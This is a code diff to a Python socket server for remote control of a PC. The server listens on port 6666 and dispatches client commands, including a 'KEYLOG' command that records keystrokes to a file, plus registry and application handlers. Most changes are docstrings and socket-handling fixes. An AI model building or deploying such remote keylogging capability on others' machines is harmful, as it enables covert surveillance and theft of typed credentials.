@@ -1,5 +1,7 @@
-
 import socket
+import os
+import time
+from pathlib import Path
 
 from handler_state import HandlerState
 
@@ -17,7 +19,7 @@ HOST = "0.0.0.0"
 PORT = 6666
 BACKLOG = 1
 
-TEMP_PATH = "temp.txt"
+KEYLOG_FILE_PATH = os.path.join(Path(__file__).parent.absolute(),"temp\\logged_key.txt")
 
 class ServerProgram:
     QUIT_PROGRAM = 0
@@ -37,19 +39,35 @@ class ServerProgram:
         self.clientSocket.close()
 
     def OpenServer(self, host=HOST, port=PORT, backlog=BACKLOG):
+        '''Open the server at (host, port) for backlog ammount of unaccepted connections
+        
+        Parameters:
+            host (str): host part
+            port (int): port
+            backlog (int): backlog number
+        '''
         self.serverSocket.bind((host, port))
         self.serverSocket.listen(backlog)
         self.clientSocket, self.address = self.serverSocket.accept()
         self.connected = True
         print(f'Connected to {self.address}')
-        pass
 
     def CloseServer(self):
+        '''Close the server associated with the program and close the clientSocket'''
         self.connected = False
+        self.serverSocket.close()
+        self.clientSocket.close()
         self.clientSocket = self.address = None
-        pass
 
     def Run(self):
+        '''
+        Enable the main loop of the Program, enable the Program to receive and handle messages from client
+         via the client socket.
+         
+        Can only be called when A client is connected
+        '''
+        if not self.clientSocket:
+            print("No client is connected, exitting")
         while True:
             req = self.ReceiveMessage()
             if not req:
@@ -57,17 +75,47 @@ class ServerProgram:
                 break
             state = self.HandleRequest(req)
             if state == ServerProgram.QUIT_PROGRAM:
+                time.sleep(1)
                 break
 
     def ReceiveMessage(self):
-        message_length = self.clientSocket.recv(HEADER).decode(FORMAT)
-        if message_length:
-            length = int(message_length)
-            rawmessage = self.clientSocket.recv(length)
-            return rawmessage.decode(FORMAT)
+        '''
+        Receive messages send through client socket, blocking the program/thread.
+
+        Returns:
+            str: if any message is received.
+            None: if any errors occur or no message is received
+        '''
+        try:
+            message_length = self.clientSocket.recv(HEADER).decode(FORMAT)
+            if message_length:
+                length = int(message_length)
+                bytesReceived = 0
+                chunks = []
+                while bytesReceived < length:
+                    message = self.clientSocket.recv(length - bytesReceived)
+                    bytesReceived += len(message)
+                    chunks.append(message)
+                
+                message = b''.join(chunks)
+                return message.decode(FORMAT)
+        except Exception as e:
+            print(e)
+            
         return None
 
     def SendMessage(self, string, binaryData=None):
+        '''
+        Send a message to client
+        
+        Parameters:
+            string (str): the request
+            binaryData (bytes, None): additional data in binary form, will be attatched to the request, separate by a single b' '
+
+        Returns:
+            True: if the message is sent properly
+            False: if any errors occurs
+        '''
         try:
             req = string.encode(FORMAT)
             if binaryData:
@@ -78,20 +126,29 @@ class ServerProgram:
             header += b' ' * (HEADER - len(header))
             
             bytes_sent = self.clientSocket.send(header)
-            assert bytes_sent == HEADER, "Length of sent message does not match that of the actual message"
+            assert bytes_sent == HEADER, "Length of message sent does not match that of the actual message"
                 
             bytes_sent = self.clientSocket.send(req)
-            assert bytes_sent == length, "Length of sent message does not match that of the actual message"
+            assert bytes_sent == length, "Length of message sent does not match that of the actual message"
 
             return True
-        except OSError as e:
+        except Exception as e:
             print(e)
-            return False
-        except AssertionError as e:
-            print(e)
-            return False
+        
+        return False
 
     def HandleRequest(self, requestString):
+        '''
+        Handle request sent by client.
+
+        Request is handled, then passed to SendMessage to send a reply with appropriate data to client, this step is blocking.
+
+        Parameters:
+            requestString (str): the reqeust string
+
+        Returns:
+            int: either ServerProgram.CONTINUE or ServerProgram.QUIT_PROGRAM
+        '''
         immediate = False
         request, data = self.SplitRequest(requestString)
 
@@ -128,7 +185,7 @@ class ServerProgram:
                     self.currHandler = ApplicationHandler()
                     state = HandlerState.SUCCEEDED
                 elif request == "KEYLOG":
-                    self.currHandler = KeystrokeHandler(TEMP_PATH)
+                    self.currHandler = KeystrokeHandler(KEYLOG_FILE_PATH)
                     state = HandlerState.SUCCEEDED
                 elif request == "REGISTRY":
                     self.currHandler = RegistryHandler()
@@ -157,15 +214,23 @@ class ServerProgram:
 
         return ServerProgram.CONTINUE_PROGRAM
 
-
     def SplitRequest(self, request):
+        '''
+        Split a string request into 2 part: base request and extraData
+
+        Parameters:
+            request (str): a string request
+
+        Returns:
+            (str | None, str | None): 2 strings if request is splitable, 1 string if not and (None, None) if request is empty
+        '''
         a = request.split(" ", 1)
         if len(a) == 2:
             return a[0], a[1]
         elif len(a) == 1:
             return a[0], None
         else:
-            raise ValueError("Empty request")
+            return None, None
 
 
 if __name__ == "__main__":
